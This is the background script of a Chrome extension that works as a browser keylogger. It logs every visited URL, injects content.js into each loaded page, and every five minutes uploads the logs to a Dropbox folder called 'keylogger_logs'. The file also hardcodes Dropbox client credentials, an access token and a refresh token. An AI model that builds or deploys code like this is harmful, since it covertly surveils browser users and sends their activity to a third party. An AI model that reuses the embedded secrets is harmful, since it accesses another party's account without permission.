// background.js

// Global configuration for Dropbox API
const DROPBOX_REFRESH_URL = "https://api.dropboxapi.com/oauth2/token";
const DROPBOX_UPLOAD_URL = "https://content.dropboxapi.com/2/files/upload";
const CLIENT_ID = "3r1bipmk6713ac6";
const CLIENT_SECRET = "u66cry0sxrcdjtg";
let ACCESS_TOKEN = "sl.u.AFi-9awkOLIH2cdRS1aNj8MfIYJ4IaDF9pEvh7qQQGTdIbasjFEDFBQM4WnqyfpAQkOhf1KwaNcgfj5oDhQV4TdCffSUS0i1JGwg8YjkaFVbR4ob0y3qSuZ1XMQPAmrRUV0ffKcYOGPMmc0W9WMrIlklKytbMkoECffdxqkjKQcHEGcIHMt9EVS4_mOAanQL2Sevj-VGeUJn7fhZvUcHB6gnzc0lWsVrprZcZcQ1aFmdkhqzM41nC_9oLqkmFXQp9gwYvBuIzo3UD61GWfuedPkTnrBx9pgfZdnrjnKbNyxUuLfDa-ieXS6oQPKkFA6ZH1J1PPz8gt-rmpqLaKSMkt_OyvhA3_Mil4JxNW6AyNjzIhqP1zZTzTLjrgCfJoOhDq6swvtywvVyfSTzdfe1LXCtpEFP3nqSjuRsb02R7CmFH3sEs-E5joPsoBZBg2kZDEyEIJ9mYnQtmjIpUoDSBHcRbQlAtghVzjeBFaLmGnrM6QheyE992JIHWvfb0Bzf2bl1BB_bDg6ewM5QoYEZMK5uTa6xbcnvyvTVwXgF3r67cC3FIG8s5ihxHJxF1RI63nyxpvZln242uqts9RIA86BlyNYzPxW_V6Go0ZtFxB4NdiWVAuObJWf3ky1nTFC7ZaYuTNr8AY39ByBfTJaeiSSn6573D-ND6umrX2IJZ3f_FhmC7CIo-2_1-pF2DBG9XS44G6Hub8jRfd6eE7pzWHgcgBNO-JkbwgEn1DflHHHCeJOoUXqvkrOf-S07X0Tb-EVyCf0iVZzrLXfM8uGIAOhT2VQhrgCTzPRBejm1tISenqbIoaO92tpNHi-PPooiP9H8LUSns2FI4cl_3dpAs_GB3G1uJ5c0bunib4jvI2PH3N4PY18NLwI3iMdh_1eiygfCaJEPINYk6XMkNhZtnrA1w6mc3AP0avPpAvd2BbbjHleaiOijujuybNqAijILWZjEV3CEAY_HRGc-VWuqdGuKWGx2zjMIFBFaPD9KnjgfHecjOTDLGdqveg63FPGgrGI8vJIu38J9bMVvxSpke1pAwdf05tMUFGw0j7s3wO1dUU7QbV2QQc3dE5zc7i4Oo1SPIPd6YyKLKLMnNow9UizJ2bX7DS4X-hroG_4hKASslSF9SjzhJ-uf9CeBKmWOjOl4CfEs4rxqFNhw_FSxmgrVlLQ26wMiXEm50C9qJJf2tMOGxvNJs024z3UEszAssrFP8_5Sfy9-v8eGFctHQ20wj1chFpWBDzNoGWCObZDPxYbzb_iRySYkfycW16kd3hMYl8kvihL4wCTRkLHb-nKNH_8lWZY0d7fL6j4ZhA3rM7aNsla8X02KJgroPPYJ-kFoX94Jw_iYJZ9kiATEixK-17CoowRKK0lMhmNLlIpQ4goxxoExP0woUhvhfRhNwZhAIxE4HmpdBIhWo75GnovL";
const REFRESH_TOKEN = "CuTUsv9vr-MAAAAAAAAAAdDwAYrN2O4DL5f4pGfbdg2aReqlfVW3venNqDiS4rlQ";

// Function to refresh Dropbox Access Token
async function refreshAccessToken() {
    console.log("🔄 Refreshing Dropbox Access Token...");

    try {
        const response = await fetch(DROPBOX_REFRESH_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
                grant_type: "refresh_token",
                refresh_token: REFRESH_TOKEN,
                client_id: CLIENT_ID,
                client_secret: CLIENT_SECRET
            })
        });

        const data = await response.json();
        if (data.access_token) {
            ACCESS_TOKEN = data.access_token;
            console.log("✅ Access token refreshed successfully.");
            return true;  // Token refresh successful
        } else {
            console.error("❌ Failed to refresh token:", data);
            return false;  // Token refresh failed
        }
    } catch (error) {
        console.error("❌ Error refreshing token:", error);
        return false;
    }
}

// Function to log visited URLs
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url) {
        chrome.storage.local.get({ logs: [] }, function (data) {
            let logs = data.logs;
            logs.push({
                type: "URL",
                value: changeInfo.url,
                timestamp: new Date().toISOString()
            });
            chrome.storage.local.set({ logs: logs }, function () {
                console.log("🌐 URL logged:", changeInfo.url);
            });
        });
    }
});

async function uploadToDropbox() {
    console.log("🔄 Refreshing access token before upload...");
    const refreshed = await refreshAccessToken();

    if (!refreshed) {
        console.error("❌ Failed to refresh token. Aborting upload.");
        return;
    }

    chrome.storage.local.get({ logs: [] }, async function (data) {
        const logs = data.logs;

        if (logs && logs.length > 0) { // Ensure logs exist and aren't empty
            const logText = JSON.stringify(logs, null, 2);
            const now = new Date();
            const dateStr = now.toISOString().replace(/[:.-]/g, '_');
            const filePath = `/keylogger_logs/log_${dateStr}.txt`;

            const requestData = {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${ACCESS_TOKEN}`,
                    "Dropbox-API-Arg": JSON.stringify({
                        path: filePath,
                        mode: "add",
                        autorename: false,
                        mute: false
                    }),
                    "Content-Type": "application/octet-stream"
                },
                body: logText
            };

            console.log(`📤 Uploading logs to Dropbox: ${filePath}...`);

            try {
                const response = await fetch(DROPBOX_UPLOAD_URL, requestData);
                const data = await response.text();

                try {
                    const jsonResponse = JSON.parse(data);

                    if (jsonResponse.error) {
                        console.error("❌ Dropbox API Error:", jsonResponse.error);
                    } else {
                        console.log("✅ Logs uploaded to Dropbox:", jsonResponse);
                        chrome.storage.local.set({ logs: [] }, () => console.log("🗑️ Logs cleared."));
                    }
                } catch (error) {
                    console.error("❌ Error parsing Dropbox response:", error);
                    console.error("❌ Raw response:", data);
                }
            } catch (error) {
                console.error("❌ Error uploading logs to Dropbox:", error);
            }
        } else {
            console.log("📭 No logs to upload.");
        }
    });
}

// Setting up the alarm for periodic uploads
chrome.alarms.create("logUploadAlarm", {
    delayInMinutes: 0,  // Initial delay of 1 minute
    periodInMinutes: 5   // Run every 5 minutes
});

chrome.alarms.onAlarm.addListener(function(alarm) {
    if (alarm.name === "logUploadAlarm") {
        uploadToDropbox();
    }
});


// 🚀 Force Inject Content Script When a Page Loads
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete") {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            files: ["content.js"]
        }, () => {
            if (chrome.runtime.lastError) {
                console.error("❌ Failed to inject content.js:", chrome.runtime.lastError.message);
            } else {
                console.log("✅:", tab.url);
            }
        });
    }
});
